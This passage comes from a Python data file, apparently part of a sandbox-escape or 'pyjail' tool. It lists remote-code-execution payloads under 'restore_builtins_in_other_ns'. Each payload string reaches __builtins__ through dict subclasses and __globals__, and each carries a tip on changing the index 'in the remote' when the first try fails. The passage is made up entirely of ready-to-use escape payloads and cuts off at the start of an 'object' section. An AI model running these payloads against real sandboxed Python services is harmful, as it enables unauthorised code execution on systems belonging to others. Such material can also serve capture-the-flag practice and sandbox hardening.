RCE_data = {
    ...
    "restore_builtins_in_other_ns": [
        ...
        ["{}.__class__.__subclasses__()[2].copy.__globals__['__builtins__']", "", "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4."],
        ["dict.__subclasses__()[2].copy.__globals__['__builtins__']", "dict", "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4."],
        ["{}.__class__.__subclasses__()[2].update.__globals__['__builtins__']", "", "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4."],
        ["dict.__subclasses__()[2].update.__globals__['__builtins__']", "dict", "If 'method_descriptor' object has no attribute '__globals__' happens in the remote, change index of the number 2 in {} to 1, 3 or 4."],
    ],
    "object": [
